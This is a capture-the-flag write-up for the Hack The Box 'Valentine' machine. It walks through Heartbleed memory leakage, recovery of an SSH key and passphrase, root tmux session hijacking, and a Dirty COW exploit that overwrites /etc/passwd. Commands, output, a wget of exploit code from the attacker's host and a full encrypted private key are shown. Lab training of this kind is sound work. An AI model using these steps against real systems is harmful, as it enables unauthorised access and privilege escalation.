@@ -1,0 +1,412 @@
+Valentine - Hack The Box - Linux Easy - HeartBleed
+
+Ports open: 22, 80, 443
+
+OpenSSH 5.9p1 is a very old version of ssh.
+Apache httpd 2.2.22 
+
+You can run a vulnerability scan 
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/valentine/nmap]
+└──╼ $sudo nmap --script vuln -oA vulnscan 10.10.10.57
+===================================================================================================================================
+
+We also run a gobuster with 50 threads
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/valentine/nmap]
+└──╼ $gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 50 
+===================================================================================================================================
+
+We navigate to the website on port 80 and 443 and we get the same image and logo. We also go over the nmap vuln scan results
+and find that the machine is vulnerable to heartbleed.
+Commands and Output:
+===================================================================================================================================
+443/tcp open  https
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
+|_  /index/: Potentially interesting folder
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+| ssl-ccs-injection: 
+|   VULNERABLE:
+|   SSL/TLS MITM vulnerability (CCS Injection)
+|     State: VULNERABLE
+|     Risk factor: High
+|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
+|       does not properly restrict processing of ChangeCipherSpec messages,
+|       which allows man-in-the-middle attackers to trigger use of a zero
+|       length master key in certain OpenSSL-to-OpenSSL communications, and
+|       consequently hijack sessions or obtain sensitive information, via
+|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
+|           
+|     References:
+|       http://www.openssl.org/news/secadv_20140605.txt
+|       http://www.cvedetails.com/cve/2014-0224
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
+| ssl-heartbleed: 
+|   VULNERABLE:
+|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
+|     State: VULNERABLE
+|     Risk factor: High
+|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+|           
+|     References:
+|       http://www.openssl.org/news/secadv_20140407.txt 
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
+|_      http://cvedetails.com/cve/2014-0160/
+| ssl-poodle: 
+|   VULNERABLE:
+|   SSL POODLE information leak
+|     State: VULNERABLE
+|     IDs:  BID:70574  CVE:CVE-2014-3566
+|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
+|           products, uses nondeterministic CBC padding, which makes it easier
+|           for man-in-the-middle attackers to obtain cleartext data via a
+|           padding-oracle attack, aka the "POODLE" issue.
+|     Disclosure date: 2014-10-14
+|     Check results:
+|       TLS_RSA_WITH_AES_128_CBC_SHA
+|     References:
+|       https://www.openssl.org/~bodo/ssl-poodle.pdf
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
+|       https://www.securityfocus.com/bid/70574
+|_      https://www.imperialviolet.org/2014/10/14/poodle.html
+|_sslv2-drown: 
+===================================================================================================================================
+
+We can also use sslyze to scan the machine.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/valentine/nmap]
+└──╼ $sslyze --heartbleed 10.10.10.79
+
+ CHECKING HOST(S) AVAILABILITY
+ -----------------------------
+
+   10.10.10.79:443                       => 10.10.10.79 
+
+
+
+
+ SCAN RESULTS FOR 10.10.10.79:443 - 10.10.10.79
+ ----------------------------------------------
+
+ * OpenSSL Heartbleed:
+                                          VULNERABLE - Server is vulnerable to Heartbleed
+
+
+ SCAN COMPLETED IN 0.88 S
+ ------------------------
+===================================================================================================================================
+
+
+SSLYZE also has flags that outputs ciphers that websites support.
+
+In order to explain heatbleed we will use a python script to analze the heartbleed attack.
+
+We search for the first result.
+
+python heartbleed github.
+https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
+
+Relevant xkcd comic:
+https://imgs.xkcd.com/comics/heartbleed_explanation.png
+
+Heartbleed basically grabs things in memory from the server. That may have sensitive data.
+
+We can run the script and see some of the output.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/valentine]
+└──╼ $python2 heartbleed.py -x 10.10.10.79
+
+defribulator v1.16
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: 10.10.10.79:443, 1 times
+Sending Client Hello for TLSv1.0
+Received Server Hello for TLSv1.0
+
+WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 1 of 1
+##################################################################
+
+  0000: 02 40 00 D8 03 01 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
+  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
+  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
+  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
+  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/valentine]
+└──╼ $python2 heartbleed.py -n 100 10.10.10.79
+
+defribulator v1.16
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: 10.10.10.79:443, 100 times
+Sending Client Hello for TLSv1.0
+Received Server Hello for TLSv1.0
+
+WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
+
+===================================================================================================================================
+
+We can edit the script. We also run it a 100 times with -n option.
+
+We go back to the gobuster output and see what was found.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/valentine/nmap]
+└──╼ $gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 50 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.79
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/05/15 00:07:31 Starting gobuster in directory enumeration mode
+===============================================================
+/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
+/index                (Status: 200) [Size: 38]                               
+/encode               (Status: 200) [Size: 554]                              
+/decode               (Status: 200) [Size: 552]                              
+/omg                  (Status: 200) [Size: 153356]                           
+/server-status        (Status: 403) [Size: 292]
+===================================================================================================================================
+
+If we go to the dev directory we find a notes.txt file with the following output
+Commands and Output:
+===================================================================================================================================
+To do:
+
+1) Coffee.
+2) Research.
+3) Fix decoder/encoder before going live.
+4) Make sure encoding/decoding is only done client-side.
+5) Don't use the decoder/encoder until any of this is done.
+6) Find a better way to take notes.
+
+===================================================================================================================================
+
+We also find a http://10.10.10.79/dev/hype_key
+
+hype key, we also see a few "0d 0a" which is a line terminator.
+We can convert hex to ascci and see what we get. We get an encrypted rsa key
+
+Commands and Output:
+===================================================================================================================================
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+
+DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
+0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
+Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
+OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
+pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
+QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
+p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
+Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
+t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
+XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
+aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
++wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
+AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
+r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
+2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
+e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
+09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
+dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
+cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
+pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
+Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
+suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
+l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
+RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+-----END RSA PRIVATE KEY-----
+===================================================================================================================================
+
+Now that we have that we go back at the output of the memory leak of running heartbleed a 100 time and we see the output of someone
+running decode.php And a hex string 
+Commands and Output:
+===================================================================================================================================
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.H ..;....#..V.f.`.cq.......................p.......p...............X..........3............}&.........A.... ..notes.txt....|&.........}.............l.............. ..hype_key.@....SC[...r....+..H...9...
+....w.3....f...
+...!.9.8.........5...............
+.........3.2.....E.D...../...A.................................I.........
+...........
+...................................#.......0.0.1/decode.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==...5..b6Tk...{..Gbq.@....SC[...r....+..H...9...
+===================================================================================================================================
+
+
+We can base64 the string and see what we get
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/valentine]
+└──╼ $echo -n "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
+heartbleedbelievethehype
+===================================================================================================================================
+
+Which is intresting if we look at the key we saved hype.key, we have an encrypted ssh key. We may be able to use this to login to the
+machine via ssh. We will use the user hype since it is being touted as hype_key which is the naming convention of ssh, "id_rsa"
+
+We enter the passphrase we got and ssh successfully.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/valentine]
+└──╼ $ssh -i hype.key hype@10.10.10.79
+The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
+ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'hype.key': 
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
+hype@Valentine:~$ 
+===================================================================================================================================
+
+We can now run linux enumeration script, linpeas.sh should suffice.
+
+Running the check we find that the kernel was built in 2012, so there are a lot vulnerabilities.
+
+Physical logins would be denoted by tty not pts.
+
+We find an open tmux session by root
+Commands and Output:
+===================================================================================================================================
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+
+root       1019  0.0  0.1  26416  1676 ?        Ss   May14   0:03 /usr/bin/tmux -S /.devs/dev_sess
+===================================================================================================================================
+
+We may be able to hijack this. Since if we look at the permissions of the file we have read/write access to the file that tmux is
+using as a socket.
+Commands and Output:
+===================================================================================================================================
+hype@Valentine:/.devs$ ls -la dev_sess 
+srw-rw---- 1 root hype 0 May 14 22:20 dev_sess
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+hype@Valentine:~$ tmux -S /.devs/dev_sess
+..
+..
+..
+
+root@Valentine:/home/hype# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Valentine:/home/hype# 
+
+===================================================================================================================================
+
+If we wanted to we could also do dirty cow.
+
+Google dirty cow ninja.
+https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+
+Commands and Output:
+===================================================================================================================================
+hype@Valentine:/dev/shm$ wget 10.10.14.18:8000/dirty.c
+--2021-05-15 02:03:14--  http://10.10.14.18:8000/dirty.c
+Connecting to 10.10.14.18:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4815 (4.7K) [text/x-csrc]
+Saving to: `dirty.c'
+
+100%[================================================================================================>] 4,815       --.-K/s   in 0s      
+
+2021-05-15 02:03:14 (150 MB/s) - `dirty.c' saved [4815/4815]
+
+..
+..
+..
+
+hype@Valentine:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt
+hype@Valentine:/dev/shm$ ls
+dirty  dirty.c  linpeas.sh
+
+..
+..
+..
+hype@Valentine:/dev/shm$ ./dirty 
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+firefart:fiRbwOlRgkx7g:0:0:pwned:/root:/bin/bash
+
+mmap: 7fe54ce31000
+madvise 0
+
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password '123'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password '123'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+hype@Valentine:/dev/shm$ su - firefart
+Password: 
+firefart@Valentine:~# id
+uid=0(firefart) gid=0(root) groups=0(root)
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
